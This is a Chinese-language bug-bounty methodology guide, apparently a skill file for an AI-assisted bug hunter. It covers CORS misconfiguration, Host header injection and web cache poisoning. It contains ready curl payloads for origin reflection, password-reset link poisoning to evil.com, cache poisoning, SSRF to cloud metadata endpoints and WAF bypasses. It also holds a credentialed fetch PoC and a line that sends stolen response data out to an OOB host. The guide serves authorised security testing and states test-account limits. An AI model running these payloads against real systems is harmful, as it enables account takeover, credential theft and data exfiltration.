# CORS 错误配置 / Host 头注入 / 缓存投毒

> 跨源信任链被打破：CORS 让攻击者源读走登录态敏感数据；Host 头把改密链接/路由指向攻击者；缓存投毒让「一次投毒、万人中招」。CORS 反射 + 凭证 + 敏感响应体 = High；改密 Host 投毒 = Critical（任意用户 ATO）；共享缓存投毒 = High。

**取材来源**（本文件内容改编自，非整库复制）：
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（sources hackerone_public）
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（sources portswigger_research + hackerone_public，report_count 16）
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（sources github/hackerone_public/portswigger_research/omergil_research/youstin_research，report_count 10）
- 权威公开源：PortSwigger Research（James Kettle "Practical Web Cache Poisoning"/"Web Cache Entanglement"、Omer Gil Web Cache Deception）——仅标注源文件已明确引用的研究

---

## 1. 触发信号

- **CORS**：响应头出现 `Access-Control-Allow-Origin`，且端点需要 session cookie 并返回 PII/token/CSRF token
- **Host 头注入**：改密/邮箱验证/邀请流程 + CDN/反代前置（Cloudflare/Varnish/Fastly/Akamai/Nginx）+ 绝对 URL 从请求 Host 构造
- **缓存投毒**：响应带 `X-Cache: HIT` / `CF-Cache-Status: HIT` / `Age: <非0>` / `Via: varnish|cloudfront|fastly`，且反射了未纳入缓存键的请求头

> 两条铁律先记（[Claude-BugHunter]）：`ACAO: *` 不能和凭证同用（浏览器拒绝）；`Access-Control-Allow-Credentials: true` 单独出现毫无意义——必须「反射你的源 + ACAC:true + 浏览器里真能读回敏感体」才叫 High。

## 2. 高频入口点

**CORS 端点优先级**（[Claude-BugHunter]）：`/api/me` `/api/profile` `/api/user` `/api/session` `/api/tokens` `/api/keys` `/api/csrf` `/api/account/settings` `/api/balance` `/api/transactions` `/api/admin/*` `/api/internal/*`——优先「需要 session + 返回 PII/token」的端点。

**Host 头危险候选**（[Claude-BugHunter]）：

```
Host   X-Forwarded-Host   X-Host   X-Forwarded-Server   X-HTTP-Host-Override
Forwarded   X-Original-URL   X-Rewrite-URL   X-Override-URL
```

**缓存未键头候选**（[Claude-BugHunter]）：`X-Forwarded-Host` `X-Host` `X-Forwarded-Scheme` `X-Original-URL` `X-Rewrite-URL` `Forwarded` `X-HTTP-Method-Override`。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **CORS 反射**：`Origin: https://evil.com` + 你的 session cookie，看 `ACAO` 是否回显 evil.com 且带 `ACAC: true`。
2. **CORS null 源**：`Origin: null`，看是否 `ACAO: null` + `ACAC: true`（sandbox iframe 可发 `Origin: null`）。
3. **CORS 正则绕过**：按第 4.2 表定位正则缺陷类，再发匹配 payload；最后**必须**浏览器 PoC 读回敏感体。
4. **Host 改密投毒**：`Host: evil.com` / `X-Forwarded-Host: evil.com` 打 `/forgot-password`，读自己测试账号邮件里的链接 host。
5. **Host 缓存投毒**：`X-Forwarded-Host: canary-xxx` 看是否反射进 body 且被缓存（`Vary` 不含该头 → 未键）。
6. **Host 路由 SSRF**：`Host: 169.254.169.254`（路径在请求行）取云元数据。

## 4. Payload 区（每条标注出处）

### 4.1 CORS 反射 / null 源检测 `[Claude-BugHunter]`

```bash
# 反射任意 Origin？
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: https://evil.com" -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
# 命中（High 类）：
#   Access-Control-Allow-Origin: https://evil.com   ← 反射攻击者源
#   Access-Control-Allow-Credentials: true          ← + 凭证 → 可读

# null 源信任
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: null" -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
# 命中：Access-Control-Allow-Origin: null + ACAC: true
```

### 4.2 可信源正则绕过（按缺陷类发 payload）`[Claude-BugHunter]`

| 服务端正则 | 缺陷 | 绕过 Origin |
|---|---|---|
| `^https?://.*\.target\.com$` | 无（转义点 + 结尾锚）| 无简单绕过，转看子域接管 |
| `^https?://.*target\.com$` | 缺 `.` 分隔 | `https://eviltarget.com` |
| `^https?://.*\.target\.com` | 缺结尾锚 `$` | `https://x.target.com.evil.com` |
| `^https?://target\.com` | 仅前缀匹配 | `https://target.com.evil.com` |
| `.*.target.com$`（点未转义）| 未转义点=任意字符 | `https://evilZtargetZcom` |

```bash
for ORIGIN in "https://evil.target.com" "https://eviltarget.com" \
  "https://x.target.com.evil.com" "https://target.com.evil.com" \
  "https://target.com%60.evil.com"; do
  curl -s -D - -o /dev/null "https://$TARGET/api/me" -H "Origin: $ORIGIN" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control" | sed "s/^/[$ORIGIN] /"
done
```

**预检绕过**（`OPTIONS`，自定义头/`PUT`/`DELETE` 触发）`[Claude-BugHunter]`：

```bash
curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom-auth, content-type" | grep -i "access-control"
# 命中：ACAO 反射 evil.com + ACAC:true + Allow-Methods: PUT + Allow-Headers: x-custom-auth
```

**浏览器 PoC（curl 不执行 CORS，必须浏览器证）**`[Claude-BugHunter]`：

```html
<!doctype html><body><pre id="out"></pre>
<script>
fetch("https://TARGET/api/me", {credentials: "include"})
  .then(r => r.text()).then(d => document.getElementById("out").innerText = d)
  .catch(e => document.getElementById("out").innerText = "BLOCKED: " + e);
</script></body>
```

### 4.3 Host 改密投毒 `[Claude-BugHunter]`

```bash
# 直接覆盖 Host / X-Forwarded-Host / X-Host / 双 Host
curl -s -X POST https://$TARGET/forgot-password -H "Host: evil.com" \
  -H "Content-Type: application/json" -d '{"email":"your-test-account@target.com"}'
curl -s -X POST https://$TARGET/forgot-password -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" -d "email=your-test-account@target.com"
# 绝对 URL 追加：Host: $TARGET.evil.com ；端口/用户信息混淆：Host: $TARGET:1@evil.com
```

**确认**：读自己测试邮箱里的改密链接，token 是否落在 evil.com / Collaborator 域下（用 Collaborator 注入可在点击时 OOB 捕获 token）。

### 4.4 Host 缓存投毒 + 路由 SSRF `[Claude-BugHunter]`

```bash
# 反射？+ 可缓存？+ 未键？
curl -s https://$TARGET/ -H "Host: $TARGET" -H "X-Forwarded-Host: canary-$RANDOM.example" | grep -i canary
curl -sI "https://$TARGET/?cb=$RANDOM" | grep -iE "cache-control|cf-cache-status|x-cache|age|via|vary"

# 证明投毒：先投毒，再干净请求（不带注入头）仍返回 payload
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null   # 投毒
curl -s "$URL" | grep -i "evilcdn.example"                        # 干净视图也中 = 投毒成功

# 路由 SSRF（Host 选上游，路径在请求行）
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://$TARGET/computeMetadata/v1/" -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"

# 路径覆盖 ACL 绕过（真实 Host 保留）
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
```

### 4.5 Web Cache Deception（路径追加静态后缀）`[Claude-BugHunter]`

```bash
# 认证会话下访问「动态页面 + 静态后缀」，CDN 按 .css/.jpg 缓存认证内容
curl -s -b "session=YOUR_SESSION" "https://target.com/account/profile.css"
# 再不带认证从另一客户端取同一 URL —— 拿到受害者数据即命中
curl -s "https://target.com/account/profile.css"
```

### 4.6 postMessage 源校验缺失 `[Claude-BugHunter]`

```bash
# 找没有严格校验 event.origin 的 message handler
grep -rEn "addEventListener\(['\"]message" recon/$TARGET/ --include="*.js" | grep -v "\.origin"
# 弱校验信号（可绕）：
#   .indexOf("target.com") > -1      <- "target.com.evil.com" 通过
#   .endsWith("target.com")          <- "eviltarget.com" 通过
#   startsWith("https://target")     <- "https://target.evil.com" 通过
```

### 4.7 缓存投毒根因 + 绕过 `[Claude-BugHunter hunt-cache-poison]`

**常见根因**：CDN 只按 URL 路径建缓存键（`*.js` 规则，忽略动态路由附加段）；反向代理转发 `X-Forwarded-Host` 给后端生成 URL 却不纳入缓存键；框架（Rails/Express）把 `/account/settings.css` 归一化到 `/account/settings`；SaaS 单 CDN 无租户隔离；错误响应（404/500）被缓存；忘加 `Vary` 或 CDN 剥离 `Vary`。

**绕过表**：

| 防御 | 绕过 |
|---|---|
| WAF 拦已知投毒头 | 换 `X-Host` / `X-Forwarded-Server` / `X-HTTP-Host-Override` / `Forwarded: host=evil.com` / 大小写 `x-forwarded-host` / 值编码 `evil%2ecom` |
| 边缘剥离攻击者头 | HTTP/2 伪头降级；HTTP Request Smuggling 把投毒请求送过 WAF 直达缓存 |
| 缓存前要求认证 | Web Cache Deception：URL 加 `.css`/`.js` 匹配缓存规则、绕过认证 |
| 缓存键含完整 query | 参数污染 `?legit=1&param=evil`（后端取首、缓存按全串）；Fat GET 请求体参数后端处理、缓存忽略 |
| 短 TTL / 快速 purge | 循环投毒（TTL 到期前重发）；路由到长 TTL 的 CDN PoP 节点 |
| `Cache-Control: private` | 查 CDN 是否被管理员全局覆盖；找相邻可缓存且反射同数据端点 |

**已披露案例（均读自源文件，引用时写你复现的行为而非抄编号）**：Shopify `X-Forwarded-Host` 缓存投毒（H1 #977851，一次投毒多 host 爆破半径）；HackerOne `X-Forwarded-Port` 投毒 DoS（H1 #409370）；GitLab `X-HTTP-Method-Override: HEAD` 空 body 覆盖 GET（H1 #1160407）；PayPal Web Cache Deception（Omer Gil，`/myaccount/home/foo.css` 缓存认证页约 5 小时）；Cloudflare Cache Deception Armor `.avif` 绕过（H1 #1391635）；Akamai hop-by-hop 头走私 → 边缘服务端投毒；James Kettle 2024 "Gotta cache 'em all" 路径归一化 + WCD。

## 5. 工具用法

```bash
# CORS 批量 + 自动化（仅 triage，不是证据）
cat live-hosts.txt | awk '{print $1}' | httpx -H "Origin: https://evil.com" -match-string "access-control-allow-origin"
pip3 install corsy && corsy -u https://$TARGET -t 10 --headers "Cookie: $SESSION_COOKIE"
nuclei -u https://$TARGET -t http/misconfiguration/cors/

# Host 头批量 fuzz（Param Miner 可自动猜更多未键头）
for H in X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override Forwarded X-Original-URL X-Rewrite-URL; do
  curl -s -I "https://$TARGET/" -H "$H: canary-$RANDOM.example" | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done

# 缓存行为确认：发两次比 Age / X-Cache
curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
```

## 6. 证据要求

- **CORS「已确认」= 浏览器 PoC**：从 evil.com 上把登录态 `fetch` 到的 `/api/me` 敏感体显示出来并截图/控制台日志。fetch 抛错/打印 `BLOCKED` = 无效，无论 curl 显示什么。
- **OOB 外带**（盲/无头场景）：把读到的 body 用 `fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(d))` 外带，每个测试用唯一 marker，命中才是你的。
- **敏感数据要求**：能读 `/api/health` 不是 High——必须 PII / token / secret / 财务数据。
- **Host 改密投毒「已确认」**：自己测试账号邮件里的 token URL 落在攻击者控制 host；最强证据 = 注入 Collaborator，点击/预览时 OOB 捕获带 token 的 HTTP 命中。
- **缓存投毒「已确认」**：**不带注入头**的干净请求（换 IP / 无痕）仍返回攻击者 payload；若 `Vary` 含该头或始终 `MISS`/`Age:0` → 降级 Low/仅自身。
- **CVSS 参考**：CORS 反射+凭证读敏感体 `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N = 6.5`；改密→任意用户 ATO `I:H/A:H = 8.1+`（通常标 Critical）；路由 SSRF→云凭据 `8.1–9.8`；共享缓存投毒 `I:H = 6.5–8.1`。

## 7. 合规边界 / 不要做的事

- **禁**：对真实用户发起改密请求——永远用**自己的测试账号**，读自己的测试邮箱。
- **禁**：把缓存投毒落地成真实 XSS / 大规模污染共享缓存；投毒测试用 `?cb=$RANDOM` 扔到一次性键上验证反射即可。
- **禁**：路由 SSRF 仅取元数据做「证明能到」，不拿真实凭据继续横向。
- **禁**：把 curl 反射头当 CORS 漏洞交——没有浏览器可读体就没有 High。
- **禁**：报告中引用未验证的 CVE / H1 ID；缓存投毒报告引用 PortSwigger/James Kettle 或 Omer Gil 研究时只写你真实复现的行为（反射头 / 缓存 HIT / OOB 命中），不抄案例编号。
- **脱敏**：读回的 PII/token 只留前 2 + 后 2 字符，Session Cookie 全打码。
